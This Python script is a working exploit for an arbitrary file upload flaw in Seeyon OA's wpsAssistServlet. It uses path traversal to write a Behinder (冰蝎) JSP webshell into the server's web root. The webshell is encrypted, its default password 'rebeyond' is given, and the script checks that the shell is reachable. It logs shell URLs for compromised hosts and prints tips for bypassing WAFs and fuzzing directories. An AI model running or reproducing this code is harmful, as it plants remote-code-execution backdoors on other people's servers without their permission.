import requests
import time
import urllib3
import buter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = "./reps/致远OAwpsAssistServlet任意文件上传-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b'
    }
poc = '/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/411804848982412312461.jsp&fileId=2'


#冰蝎 默认密码 rebeyond
data = '''--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name="upload"; filename="test.txt"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<%@page\r\nimport="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>\r\n<%!class\r\nU\r\nextends\r\nClassLoader{U(ClassLoader\r\nc){super(c);}\r\npublic\r\nClass\r\ng(byte\r\n[]b){return\r\nsuper.defineClass(b,0,b.length);}}%>\r\n<%if\r\n(request.getMethod().equals("POST")){\r\nString\r\nk="e45e329feb5d925b";\r\nsession.putValue("u",k);\r\nCipher\r\nc=Cipher.getInstance("AES");\r\nc.init(2,new\r\nSecretKeySpec(k.getBytes(),"AES"));\r\nString\r\ninput=\r\nrequest.getReader().readLine();\r\nnew\r\nU(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(input))).newInstance().equals(pageContext);\r\n}%>\r\n--59229605f98b8cf290a7b8908b34616b--'''


def sywfileip(url):
    try:
        rep = requests.post(url=url + poc, data=data, headers=headers, timeout=3, verify=False)
        if rep.status_code == 200:
            reps = requests.get(url=url + "/411804848982412312461.jsp", headers=headers, verify=False, timeout=3)
            if '"success":true' in rep.text:
                print(buter.colors.GREEN+ f"存在致远OA_wpsAssistServlet任意文件上传 shell_path {url}/411804848982412312461.jsp  请使用冰蝎3.x_connect_ rebeyond" + buter.colors.END)
                f = open(filename, "a+", encoding="utf-8")
                f.write(f"{url}/411804848982412312461.jsp 请使用冰蝎3.x_connect_ rebeyond")
                f.write("\n")
                f.close()
                if reps.status_code != 200:
                    print(buter.colors.GREEN+ "存在杀软 bypass_waf payload 在脚本源码中,请自己手工尝试,这个格式的payload作者自己不会写,,,,,"+ buter.colors.END)
            elif '拒绝访问' in rep.text:
                print(buter.colors.GREEN+ f"存在致远OA_wpsAssistServlet任意文件上传 但目标存在waf,请手工绕过限制 url : {url}"+buter.colors.END)
            elif 'No such file or directory' in rep.text or '没有那个文件或目录' in rep.text:
                print(buter.colors.GREEN+  f"可能存在致远OA_wpsAssistServlet任意文件上传 目标返回 : payload 目录错误 目标已更改默认目录 请自行FUZZ url : {url}" + buter.colors.END)
            else:
                print(buter.colors.END+ f"未知情况 url : {url}"+buter.colors.END)
        else:
            print(buter.colors.RED+f"不存在致远OA_wpsAssistServlet任意文件上传 {url}" + buter.colors.END)
    except Exception as e:
        print(buter.colors.RED + f"ERROR : {e}" + buter.colors.END)

